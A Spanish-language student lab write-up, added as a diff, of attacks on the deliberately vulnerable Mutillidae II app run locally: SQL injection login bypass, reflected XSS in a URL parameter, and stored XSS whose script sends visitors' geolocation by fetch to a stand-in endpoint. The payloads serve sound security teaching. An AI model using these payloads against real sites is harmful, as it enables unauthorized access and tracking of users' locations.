@@ -1,0 +1,25 @@
+Actividad clase 2---- Todo esto es con fines educativos!!!!!!!!!!!!!!
+
+La primera prueba consistió en explotar una vulnerabilidad de tipo inyección SQL en el módulo de autenticación. Se accedió a la página de inicio de sesión (login.php) a través del menú principal. Una vez en el formulario, se identificaron dos campos: uno para ingresar el nombre de usuario y otro para la contraseña. En el campo de nombre de usuario se ingresó el siguiente texto: ' OR '1'='1. ![alt text](image.png) En el campo de contraseña se escribió cualquier valor, ya que no iba a ser evaluado por el motor SQL de manera efectiva. Posteriormente se presionó el botón de "Login". La página procesó la solicitud y permitió el ingreso al sistema, demostrando que no existía una validación correcta del contenido ingresado, y que la consulta SQL construida dinámicamente en el backend estaba vulnerable a manipulaciones. Al incluir una condición siempre verdadera como '1'='1', se logró que la cláusula WHERE no filtrara correctamente, otorgando acceso a la cuenta sin verificar credenciales reales. Esta prueba confirmó que el sistema no empleaba consultas preparadas ni sanitización de entradas. ![alt text](image-1.png)
+
+A continuación se realizó una segunda prueba, esta vez orientada a detectar una vulnerabilidad de tipo Cross-Site Scripting reflejado. Para esto se utilizó el módulo de información del navegador, accesible en browser-info.php. Desde esta sección, se aprovechó que la aplicación tomaba los datos enviados por la URL y los mostraba directamente en el cuerpo de la página. Se modificó manualmente la URL del navegador, añadiendo el siguiente parámetro: &UserAgent=<script>alert('Verificacion de prueba')</script>. ![alt text](image-2.png) Una vez cargada la página con la nueva URL, el navegador mostró una ventana emergente con el mensaje “Verificacion de prueba”. Esto demostró que el contenido inyectado en el parámetro fue interpretado como código JavaScript en lugar de ser mostrado como texto plano. No existía ningún tipo de codificación HTML o escape de caracteres en el parámetro “UserAgent”, lo que permitió que el script se ejecutara directamente al ser reflejado en la respuesta HTML. Este tipo de fallo puede ser utilizado por un atacante para ejecutar código malicioso en navegadores de terceros, simplemente con inducir a un usuario a hacer clic en un enlace modificado.
+
+La tercera prueba se enfocó en una vulnerabilidad de tipo XSS persistente. Se utilizó el módulo para añadir entradas al blog personal del usuario, accediendo a add-to-your-blog.php. En esta página se encontraron dos campos principales: uno para el título del post y otro para el contenido de la entrada. En el campo del título se colocó el texto “Mi primer post”, mientras que en el área de contenido se insertó el siguiente script malicioso:
+
+<script>
+navigator.geolocation.getCurrentPosition(function(pos) {
+  fetch("http://localhost/log.php?lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude);
+});
+</script>
+
+![alt text](image-3.png)
+
+Una vez completado el formulario, se presionó el botón de "Save" para guardar la entrada. Luego se accedió a la sección para visualizar las entradas publicadas (view-someones-blog.php). Al cargar la página, el script se ejecutó automáticamente, invocando la función navigator.geolocation.getCurrentPosition. Esto generó una solicitud al usuario para permitir el acceso a su ubicación. En caso de aceptación, el navegador obtuvo las coordenadas geográficas actuales del dispositivo y envió esa información a una dirección de prueba (http://localhost/log.php) utilizando fetch. ![alt text](image-4.png) 
+
+![alt text](image-5.png)
+
+Este comportamiento demostró que los datos almacenados no estaban siendo sanitizados ni filtrados antes de ser insertados en el DOM, lo que permite que código JavaScript persistente se ejecute cada vez que se visualiza el contenido comprometido. A diferencia del XSS reflejado, donde el ataque requiere que la víctima acceda a una URL maliciosa, en el caso de XSS persistente el código queda guardado permanentemente en el servidor. Esto implica que cualquier visitante que acceda a la página con la entrada infectada podría ser afectado sin necesidad de interacción previa.
+
+Esta técnica también ilustra cómo una simple vulnerabilidad puede escalar a una amenaza más grave: con solo otorgar permisos de ubicación, un atacante podría rastrear movimientos, triangular ubicaciones o incluso correlacionar usuarios con patrones geográficos. En este ejemplo, la dirección localhost/log.php se usó como un endpoint ficticio para la prueba en entorno local, pero en un ataque real podría tratarse de un servidor controlado externamente.
+
+Todas las pruebas se realizaron en un entorno local controlado, utilizando un navegador actualizado y una instalación limpia de Mutillidae II sobre un servidor local (XAMPP, WAMP o similar). Estas prácticas permitieron explorar de forma segura tres de las vulnerabilidades más comunes y peligrosas en aplicaciones web, entendiendo cómo se ejecutan y cómo se comportan desde el punto de vista del atacante.
